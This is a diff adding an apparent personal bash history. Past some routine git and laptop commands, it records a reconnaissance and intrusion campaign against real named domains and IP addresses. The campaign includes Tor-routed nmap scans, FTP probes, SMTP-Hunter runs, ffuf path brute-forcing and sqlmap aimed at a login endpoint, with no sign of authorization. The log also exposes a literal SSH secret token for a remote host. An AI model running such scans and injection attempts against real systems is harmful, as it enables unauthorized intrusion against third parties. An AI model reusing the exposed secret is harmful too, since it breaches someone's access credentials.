@@ -1,0 +1,500 @@
+nvim config/plugins.ts 
+git stash
+git pull origin main
+git stash pop
+rm -rf yarn.lock 
+nvim config/plugins.ts 
+git diff
+nvim config/plugins.ts 
+./start_dev.sh 
+nvm use 22.0.0
+./start_dev.sh 
+git add .
+git commit -m "muh strapi mail gnegne"
+git push origin main
+sudo nmtui
+cat .chrono 
+cd projects/chrono/
+ls
+cd BACKEND/
+nvim start_dev.sh 
+git add .
+git commit -m "quack start_dev.sh"
+git push origin main
+git push origin main
+git push origin main
+sudo nmtui
+cat .chrono 
+cd projects/chrono/
+cd FRONTEND/
+git pull origin main
+rm -rf yarn.lock 
+git pull origin main
+brightnessctl 
+sudo brightnessctl --device intel_backlight
+sudo brightnessctl --device intel_backlight s 0
+sudo brightnessctl --device intel_backlight s 1000
+sudo brightnessctl --device intel_backlight s 24242
+ls /sys/class/leds/tpacpi\:\:kbd_backlight/
+echo 1 > /sys/class/leds/tpacpi\:\:kbd_backlight/brightness 
+sudo echo 1 > /sys/class/leds/tpacpi\:\:kbd_backlight/brightness 
+nvim /sys/class/leds/tpacpi\:\:kbd_backlight/brightness 
+sudo nvim /sys/class/leds/tpacpi\:\:kbd_backlight/brightness 
+sudo nmtui
+cat .chrono 
+nmap casapounditalia.org
+xbps-query -Rs nmap
+sudo xbps-install nmap
+sudo xbps-install torsocks
+torsocks nmap casapounditalia.org
+nmap casapounditalia.org
+ping casapounditalia.org
+sudo nmtui
+sudo sv restart NetworkManager
+sudo nmtui
+nmap casapounditalia.org
+ping casapounditalia.org
+nmap 172.67.183.197
+nmap 172.67.183.197 -sV
+sudo nmtui
+cd projects/chrono/
+ls
+cd FRONTEND/
+git pull origin main
+sudo nmtui
+sudo nmtui
+sudo nmtui
+sudo sv restart NetworkManager
+sudo nmtui
+sudo nmtui
+sudo sv restart NetworkManager
+sudo nmtui
+ssh root@segfault
+sudo nmtui
+ssh root@segfault.net
+ping linux.com
+ping linux.com
+sudo nmtui
+ping linux.com
+sudo nmtui
+sudo sv restart NetworkManager
+sudo nmtui
+ping linux.com
+torsocks ssh root@segfault
+torsocks ssh root@segfault
+torsocks ssh root@segfault.net
+torsocks ssh root@segfault.net
+torsocks ssh root@segfault.net
+torsocks ssh root@segfault.net
+torsocks ssh root@segfault.net
+torsocks ssh root@segfault.net
+ssh root@segfault.net
+torsocks ssh root@segfault.net
+torsocks ssh root@segfault.net
+ssh -o "SetEnv SECRET=cWDLUrBQbVqimCfKRWGGgOtu" root@adm.segfault.net
+torsocks ssh -o "SetEnv SECRET=cWDLUrBQbVqimCfKRWGGgOtu" root@adm.segfault.net
+sudo nmtui
+nmap -sS -sV militarystoresrl.com
+sudo nmap -sS -sV militarystoresrl.com
+nmap -sV 62.149.215.187
+torsocks nmap -sV 62.149.215.187
+nmap -sV 62.149.215.187
+nmap -sS 62.149.215.187
+sudo nmap -sS 62.149.215.187
+sudo nmap -Pn 62.149.215.187
+sudo nmap -Pn -p- 62.149.215.187
+nmap 62.149.215.187
+nmap app.militarystoresrl.com
+nmap app.militarystoresrl.com
+nmap 62.149.215.187
+nmap -sS 62.149.215.187
+sudo nmap -sS 62.149.215.187
+sudo nmap -sS -sV -Pn 62.149.215.187
+ping linux.com
+torsocks nmap 62.149.215.187:587
+torsocks ssh -o "SetEnv SECRET=cWDLUrBQbVqimCfKRWGGgOtu" root@adm.segfault.net
+sudo nmtui
+xbps-query -Rs puredns
+xbps-query -Rs pure
+ft
+gtp
+ftp
+xbps-query -Rs ftp
+sudo xbps-install ncftp
+ftp
+xlocate ftp
+sudo torsocks lftp ftp://62.149.215.158:21
+sudo nmtui
+torsocks lftp ftp://62.149.215.158:21
+lftp ftp://62.149.215.158:21
+sudo nmtui
+lftp ftp://
+nmap 62.149.215.158
+nmap -sV -O 62.149.215.158
+sudo nmap -sV -O 62.149.215.158
+convert -size 0x0 -background white x.png
+convert -size 0x0  xc:white x.png
+cat x.png 
+sudo nmap -sV -O 62.149.215.187
+sudo nmap -sV -vV -O 62.149.215.187
+sudo nmap -sV -v -O 62.149.215.187
+pwd
+cd projects/not-owning-casapound/
+ls
+git clone https://github.com/exfil0/SMTP-Hunter
+ls
+cd SMTP-Hunter/
+ls
+python -m venv .venv
+source .venv/bin/activate
+pip install requirements.txt 
+pip install -r requirements.txt 
+ls
+python smtp-hunter.py 
+python smtp-hunter.py 
+nvim smtp-hunter.py 
+pyenv
+python smtp-hunter.py 
+torsocks python smtp-hunter.py 
+torsocks python smtp-hunter.py 62.149.215.187:587
+nvim smtp-hunter.py 
+torsocks python smtp-hunter.py 62.149.215.187:587
+torsocks python smtp-hunter.py 62.149.215.187:587
+python smtp-hunter.py 62.149.215.187:587
+torsocks python smtp-hunter.py 62.149.215.187:587
+torsocks python smtp-hunter.py 62.149.215.187:587
+ls
+ungoogled-chromium smtp_pentest_report_62_149_215_187\:587_1774667029.html 
+nvim smtp-hunter.py 
+torsocks python smtp-hunter.py 62.149.215.187:587
+python
+ls
+pyenv 
+pyenv install 3.8
+cd projects/not-owning-casapound/
+pyenv
+pyenv init 3.8
+sudo xbps-query -Rs burp
+sudo nmtui
+sudo sv restart NetworkManager
+sudo nmtui
+cd tools
+ls
+git clone https://github.com/d3mondev/puredns
+cd puredns/
+ls
+make build
+cd ..
+git clone https://github.com/blechschmidt/massdns.git
+cd massdns/
+make
+sudo make install
+lol
+whoami
+massdns 
+sudo xbps-install go
+go install github.com/d3mondev/puredns/v2@latest
+c d..
+cd ..
+ls
+cd ..
+cd projects/
+ls
+mkdir not-owning-casapound
+cd not-owning-casapound/
+wget https://raw.githubusercontent.com/n0kovo/n0kovo_subdomains/refs/heads/main/n0kovo_subdomains_medium.txt
+puredns
+massdns
+nmap https://www.avgioberti.it/
+nmap -sS avgioberti.it
+sudo nmap -sS -p- avgioberti.it
+sudo nmap -sS  avgioberti.it
+sudo torsocks nmap -sS  app.militarystoresrl.com
+sudo  nmap -sS  app.militarystoresrl.com
+torsocks mariadb
+sudo  nmap -sV  militarystoresrl.com
+sudo nmtui
+sudo sv restart NetworkManager
+sudo nmtui
+ping linux.com
+sudo xbps-install ftp
+sudo xbps-install lftp
+lftp
+ls
+pyenv
+pyenv activate
+pyenv virtualenvs
+$PYENV
+$PYENV_ROOT
+/home/edo/.pyenv:
+/home/edo/.pyenv/bin/pyenv 
+/home/edo/.pyenv/bin/pyenv activate
+/home/edo/.pyenv/bin/pyenv init
+nvim .bash_profile 
+export PYENV_ROOT="$HOME/.pyenv"
+[[ -d $PYENV_ROOT/bin ]] && export PATH="$PYENV_ROOT/bin:$PATH"
+eval "$(pyenv init - bash)"
+pyenv activate
+pyenv activate 3.8
+ls
+pyenv activate 3.8
+pyenv
+ls
+cd projects/not-owning-casapound/
+pyenv
+rm -rf SMTP-Hunter/.venv/
+cd SMTP-Hunter/
+pyenv
+pyenv commands
+pyenv which
+pyenv global 3.8
+pyenv activate
+pyenv
+python
+python -m venv .venv
+source .venv/bin/activate
+pip install -r requirements.txt 
+torsocks python smtp-hunter.py 62.149.215.187:587
+torsocks activate
+pyenv
+pyenv init
+export PYENV_ROOT="$HOME/.pyenv"
+[[ -d $PYENV_ROOT/bin ]] && export PATH="$PYENV_ROOT/bin:$PATH"
+eval "$(pyenv init - bash)"
+pyenv install 3.12
+pyenv install 3.12
+pyenv global 3.12
+ls
+cd projects/not-owning-casapound/
+python SMTP-Hunter/smtp-hunter.py 
+cd SMTP-Hunter/
+python
+python -m venv .venv
+source .venv/bin/activate
+python
+rm -rf .venv/
+cd projects/not-owning-casapound/
+python
+python -m venv .venv
+source .venv/bin/
+source .venv/bin/activate
+python
+ls
+pip install -r SMTP-Hunter/requirements.txt 
+torsocks python SMTP-Hunter/smtp-hunter.py 62.149.215.187:587
+ungoogled-chromium smtp_pentest_report_62_149_215_187\:587_1774668348.html 
+sudo torsocks python SMTP-Hunter/smtp-hunter.py 62.149.215.187:587
+sudo torsocks python SMTP-Hunter/smtp-hunter.py vm286.interferenza.net:587
+torsocks ssh root@segfault.net
+wget whatismyip.com
+torsocks wget whatismyip.com
+torsocks ssh root@segfault.net
+sudo nmtui
+python SMTP-Hunter/smtp-hunter.py vm286.interferenza.net:587
+sudo torsocks python SMTP-Hunter/smtp-hunter.py 62.149.215.187:587
+python SMTP-Hunter/smtp-hunter.py 62.149.215.187:587
+python SMTP-Hunter/smtp-hunter.py 62.149.215.187:25
+python SMTP-Hunter/smtp-hunter.py 62.149.215.187:25
+python SMTP-Hunter/smtp-hunter.py 62.149.215.187
+nmap -sV app.militarystoresrl.com
+nmap -sV militarystoresrl.com
+nmap -sV militarystoresrl.com
+nmap -sV militarystoresrl.com
+ls
+sudo sv restart tor
+torsocks ssh -o "SetEnv SECRET=cWDLUrBQbVqimCfKRWGGgOtu" root@adm.segfault.net
+torsocks ssh -o "SetEnv SECRET=cWDLUrBQbVqimCfKRWGGgOtu" root@adm.segfault.net
+ nmap -sS -sV -Pn 62.149.215.187
+sudo nmap -sS -sV -Pn 62.149.215.187
+history | grep smtp
+history | grep smtp
+history | grep SMTP
+history | grep python
+sudo nmtui
+sudo nmtui
+ping linux.com
+sudo nmtui
+sudo sv restart NetworkManager
+ftp
+dig
+xbps-query -Rs dig
+sudo xbps-install dig
+sudo xbps-install bin
+dig
+bind
+bind
+dig
+sudo xbps-install -Sy dnsutils
+sudo xbps-install -y dnsutils
+xbps-query -Rs dnsutils
+xbps-query -Rs dns
+xbps-query -Rs dns-
+xbps-query -Rs dns-u
+xbps-query -Rs dns-
+iproute
+rote
+route
+nc
+nc 62.149.215.187:25
+nc 62.149.215.187:25
+nc 62.149.215.187 -p 25
+nc 62.149.215.187 p 25
+nc 62.149.215.187 25
+HELO
+nc 62.149.215.187 587
+python SMTP-Hunter/smtp-hunter.py 62.149.215.187 --port 587
+ls
+jq
+cat output_file | jq -c '.results[] | {url:.url,status: .status}'
+sudo xbps-install jq
+cd projects/not-owning-casapound/
+ls
+source .venv/bin/activate
+python SMTP-Hunter/smtp-hunter.py 
+python SMTP-Hunter/smtp-hunter.py
+python SMTP-Hunter/smtp-hunter.py 62.149.215.187
+nvim SMTP-Hunter/smtp-hunter.py 
+nvim SMTP-Hunter/smtp-hunter.py 
+python SMTP-Hunter/smtp-hunter.py 62.149.215.187 -p 587
+python SMTP-Hunter/smtp-hunter.py 62.149.215.187 --port 587
+firefox smtp_pentest_report_62_149_215_187_1774695308.html
+rpcinfo
+sudo xbps-install rpcinfo
+xlocate rpcinfo
+sudo xbps-install rpcbind
+xlocate rpcinfo
+rpcinfo
+rpcinfo -p
+rpcinfo -p
+rpcinfo -h
+rpcinfo 62.149.215.187
+rpcinfo 62.149.215.187
+rpcinfo 62.149.215.187:111
+rpcinfo -p 62.149.215.187:111
+rpcinfo -p 62.149.215.187
+rpcinfo -p 62.149.215.187
+nmap -sS -sV -Pn 62.149.215.187
+sudo nmap -sS -sV -Pn 62.149.215.187
+ftp 62.149.215.187
+lftp 62.149.215.187
+lftp 62.149.215.187
+sudo nmap -sS -sV -Pn -P- 62.149.215.187
+sudo nmap -sS -sV -Pn p-- 62.149.215.187
+sudo nmap -sS -sV -Pn -p- 62.149.215.187
+sudo nmtui
+sudo nmtui
+nmap -sS -sV militarystoresrl.com
+sudo nmap -sS -sV militarystoresrl.com
+dir
+ls
+xbps-query -Rs ferox
+xbps-query -Rs 
+xbps-query -Rs ffuf
+sudo xbps-install ffuf
+ls
+pwd
+mv ../../Downloads/Subdomain.txt .
+ls
+ffuf
+ffuf -w Subdomain.txt -u https://militarystoresrl.com/FUZZ -mc all -fs 42 -c -v
+ls
+cat Subdomain.txt | grep -l 10 
+cat Subdomain.txt | head -n 10 
+cat Subdomain.txt | head -n 100
+cat Subdomain.txt | head -n 10000 > Subdomain-10000.txt 
+ffuf -w Subdomain-10000.txt -u https://militarystoresrl.com/FUZZ -mc all -fs 42 -c -v
+ffuf -w Subdomain-10000.txt -u https://militarystoresrl.com/FUZZ -mc all -fs 42 -c -v
+ls
+cat bruteforce_timing.png 
+ls
+ffuf -w Subdomain-10000.txt -u https://militarystoresrl.com/FUZZ -mc all -fs 42 -c -v -o ffuf.txt
+cat ffuf.txt 
+cat ffuf.txt 
+ffuf -w Subdomain-10000.txt -u https://militarystoresrl.com/FUZZ -mc all -fs 42 -c -v -o ffuf.txt
+ffuf -w Subdomain-10000.txt -u https://militarystoresrl.com/en/FUZZ -mc all -fs 42 -c -v -o ffuf.txt
+cat ffuf.txt 
+cat ffuf.txt | grep 200
+cat ffuf.txt | grep 200
+xlocate jq
+sudo xbps-install jq
+ls
+cat ffuf.txt | jq -c '.results[] | {url:.url,status: .status}'
+cat ffuf.txt | jq -c '.results[] | {url:.url,status: .status}' | grep 200
+cat ffuf.txt | jq -c '.results[] | {url:.url,status: .status}' | grep 405
+cat ffuf.txt | jq -c '.results[] | {url:.url,status: .status}' 
+cat ffuf.txt | jq -c '.results[] | {url:.url,status: .status}' | grep 200
+wget https://militarystoresrl.com/en/
+cat index.html 
+rm -rf index.html 
+ffuf -w fuzz_wordlist.txt -u https://militarystoresrl.com/en/FUZZ -mc all -fs 42 -c -v -o ffuf.txt
+cat ffuf.txt | jq -c '.results[] | {url:.url,status: .status}' | grep 200
+cat ffuf.txt | jq -c '.results[] | {url:.url,status: .status}' | grep :200
+cat ffuf.txt | jq -c '.results[] | {url:.url,status: .status}' | grep :405
+cat ffuf.txt | jq -c '.results[] | {url:.url,status: .status}' | grep :401
+cat ffuf.txt | jq -c '.results[] | {url:.url,status: .status}' | grep :402
+cat ffuf.txt | jq -c '.results[] | {url:.url,status: .status}' | grep :403
+cat ffuf.txt | jq -c '.results[] | {url:.url,status: .status}' | grep :404
+cat ffuf.txt | jq -c '.results[] | {url:.url,status: .status}' | grep :300
+cat ffuf.txt | jq -c '.results[] | {url:.url,status: .status}' | grep :301
+ffuf -w fuzz_wordlist.txt -u https://militarystoresrl.com/en/FUZZ -mc all -fs 200,401 -p 0.4 -c -v -o ffuf.txt
+ffuf -w fuzz_wordlist.txt -u https://militarystoresrl.com/en/FUZZ -mc 200,401 -fs 42 -p 0.4 -c -v -o ffuf.txt
+ffuf -w fuzz_wordlist.txt -u https://militarystoresrl.com/en/FUZZ -mc 200,401,4 -fs 42 -p 10 -c -v -o ffuf.txt
+ffuf -w fuzz_wordlist.txt -u https://militarystoresrl.com/en/FUZZ -mc 200,401 -fs 42 -p 1 -c -v -o ffuf.txt
+cat ffuf.txt | jq -c '.results[] | {url:.url,status: .status}' | grep :300
+cat ffuf.txt | jq -c '.results[] | {url:.url,status: .status}' | grep 200
+cat ffuf.txt | jq -c '.results[] | {url:.url,status: .status}' 
+ls
+ls -la
+cat ffuf.txt 
+cat ffuf.txt | jq -c '.results[] | {url:.url,status: .status}' 
+cat ffuf.txt | jq -c '.results[] | {url:.url,status: .status}'
+nmap -sS -sV -Pn 62.149.215.187
+nmap 62.149.215.187
+nmap -sS -sV 62.149.215.187
+sudo nmap -sS -sV 62.149.215.187
+lftp 62.149.215.187
+lftp 62.149.215.187 -p 21
+lftp 62.149.215.187:21
+lftp 62.149.215.187:21
+sudo nmap -sS -sV 62.149.215.187
+ls
+ls
+pwd
+cd ..
+ls
+cd not-owning-casapound/
+ls
+ffuf -w fuzz_wordlist.txt -u https://62.149.215.187:8443/FUZZ -mc 200,401,403 -fs 42 -p 1 -c -v -o ffuf.txt
+ffuf -w fuzz_wordlist.txt -u https://62.149.215.187:8443/dm/FUZZ -mc 200,401,403 -fs 42 -p 1 -c -v -o ffuf.txt
+sudo nmap -sS -sV 62.149.215.187
+ls
+cd projects/not-owning-casapound/
+ls
+cd SMTP-Hunter/
+ls
+torsocks python smtp-hunter.py 
+sudo nmtui
+sudo sv restart NetworkManager
+sudo nmtui
+ping linux.com
+sudo nmtui
+ping linux.com
+xbps-query -Rs sqlmap
+sudo xbps-install sqlmap
+sqlmap
+sqlmap.py 
+sqlmap.py  -h
+sqlmap.py  -u 62.149.215.187:8443
+sqlmap.py  -u https://62.149.215.187:8443
+sqlmap.py  -u https://62.149.215.187:8443/dm/log.php?action=in
+sudo nmap -sS -sV 62.149.215.187
+sqlmap.py  -u 62.149.215.187:8443
+sqlmap
+sqlmap.py 
+sqlmap.py -h
+ls
+sudo nmtui
+ls
+cd projects/
+ls
+sudo nmtui
